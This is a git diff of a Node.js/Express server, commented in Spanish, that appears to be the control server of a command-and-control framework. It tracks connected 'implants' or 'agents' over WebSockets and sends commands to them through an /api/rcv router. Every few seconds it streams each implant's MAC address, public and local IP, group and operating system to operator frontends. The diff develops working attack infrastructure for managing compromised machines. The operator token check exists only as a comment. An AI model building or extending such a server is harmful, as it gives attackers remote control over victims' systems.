@@ -8,92 +8,121 @@ import { WebSocketServer } from 'ws';
 import http from 'http'
 import cmd_router from './routes/cmd_routes.mjs';
 import implant_router from './routes/implant_routes.mjs';
-import mongoose from 'mongoose';
 import Implant from './models/Implant_model.mjs';
+import cors from 'cors'
 
 
-const webSocketsServer = async(httpServer)=>{
 
-    try {
-        const server = new WebSocketServer({ server: httpServer });
-        const clients = new Map();
-    
-        server.on('connection', (socket, request) => {
-            const url = new URL(request.url, `http://${request.headers.host}`);
-            const clientId = url.searchParams.get('id');
-    
-            if (!clientId) {
-                console.log("Cliente sin ID, cerrando");
-                socket.close();
-                return;
-            }
-    
-            if (clients.has(clientId)) {
-                console.log(`Cliente con ID ${clientId} ya conectado. Reemplazando conexión.`);
-                clients.get(clientId).terminate();
-            }
-    
-            console.log(`Cliente conectado con ID: ${clientId}`);
-            clients.set(clientId, socket);
-            socket.isAlive = true;
-    
-            socket.on('pong', () => socket.isAlive = true);
-    
+const webSocketsServer = async (httpServer) => {
+  try {
+    const server = new WebSocketServer({ server: httpServer });
+    const agents = new Map();   // Mapa de agents conectados (por ID)
+    const users = new Set();  // Set de users conectados (frontends)
 
-    
-            socket.on('close', () => {
-                console.log(`Cliente ${clientId} desconectado`);
-                clients.get(clientId).isAlive=false;
-            });
+    server.on('connection', (socket, request) => {
+      const url = new URL(request.url, `http://${request.headers.host}`);
+      const clientId = url.searchParams.get('id');
+      const rol = url.searchParams.get('rol');
+
+      // Si es usuario (frontend)
+      if (rol === 'usuario') {      //cvalidacion de token
+        console.log('Usuario conectado (frontend)');
+        users.add(socket);
+
+        socket.on('close', () => {
+          console.log('Usuario desconectado');
+          users.delete(socket);
         });
-    
-        const interval = setInterval(async() => {
-  
-            const db_clients = await Implant.find();
-            const client_db_list = db_clients.map((x)=>x.impl_id);
-            let status_connections = []
+
+        return;
+      }
+
+      // Si es agente
+      if (!clientId) {
+        console.log("Cliente sin ID, cerrando");
+        socket.close();
+        return;
+      }
+
+      if (agents.has(clientId)) {
+        console.log(`Agente ${clientId} ya conectado. Reemplazando conexión.`);
+        agents.get(clientId).terminate();
+      }
+
+      console.log(`Agente conectado con ID: ${clientId}`);
+      agents.set(clientId, socket);
+      socket.isAlive = true;
+
+      socket.on('pong', () => socket.isAlive = true);
+
+/*       socket.on('message', (data) => {  //validar token de usuario
+        try {
+          const msg = JSON.parse(data);
 
 
-            client_db_list.forEach(db_id => {
-                // Verificar si el ID está en el Map de WebSockets
-                const ws = clients.get(db_id);
-                
-                if (ws) {
-                    // Si la conexión existe, verificar si está activa
-                    if (ws.isAlive) {
-                        status_connections.push({ id: db_id, status: 'active' });
-                    } else {
-                        status_connections.push({ id: db_id, status: 'inactive' });
-                    }
-                } else {
-                    // Si el ID no existe en el Map, marcar como inactive
-                    status_connections.push({ id: db_id, status: 'inactive' });
-                }
-            });
+        } catch (e) {
+          console.error('Error procesando mensaje:', e);
+        }
+      }); */
 
-            console.log(status_connections);
-    
+      socket.on('close', () => {
+        console.log(`Agente ${clientId} desconectado`);
+        agents.delete(clientId);
+      });
+    });
 
-        }, 10000);
-    
-        server.on("close", () => clearInterval(interval));
-        
-        return clients;
+    // Intervalo para verificar estado de los agents y notificar users
+    const interval = setInterval(async () => {
+      const db_clients = await Implant.find(); // Asumo que `clients` es una colección de DB
+      const client_db_list = db_clients.map(x => x);
+      const status_connections = [];
 
-    } catch (error) {
-        console.log(error);
-        return false;
-    }
+      client_db_list.forEach((c) => {
+        const ws = agents.get(c.impl_id);
+        if (ws) {
+          if (ws.isAlive) {
+            status_connections.push({ id: c.impl_id, status: 'active', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
+          } else {
+            status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
+          }
+        } else {
+          status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
+        }
+      });
 
-    
-}
+
+
+      // Enviar estados a todos los users conectados
+      const payload = {
+        data: status_connections
+      };
+
+      
+    // Reenviar a todos los users
+    users.forEach(userSocket => {
+      if (userSocket.readyState === userSocket.OPEN) {
+        userSocket.send(JSON.stringify(status_connections));
+      }
+    });
+    }, 5000);
+
+    server.on("close", () => clearInterval(interval));
+
+    return { agents, users };
+
+  } catch (error) {
+    console.error('Error en WebSocket server:', error);
+    return false;
+  }
+};
+
 
 const main = async () =>{
     
     configDotenv();
     const app = express();
     await db_connection();
-    
+    app.use(cors());
     
     app.use(helmet())
     
@@ -101,10 +130,10 @@ const main = async () =>{
     app.use(express.urlencoded({ extended: true })); // Para formularios HTML
     app.use(express.static('public'));
     const server = http.createServer(app);
-    const clients = await webSocketsServer(server)
+    const {agents} = await webSocketsServer(server)
     
     app.use('/api/auth', authRouter)
-    app.use('/api/rcv', cmd_router(clients))
+    app.use('/api/rcv', cmd_router(agents))
     app.use('/api/impl', implant_router())
     //------Type errors-----
     app.use(type_errors);
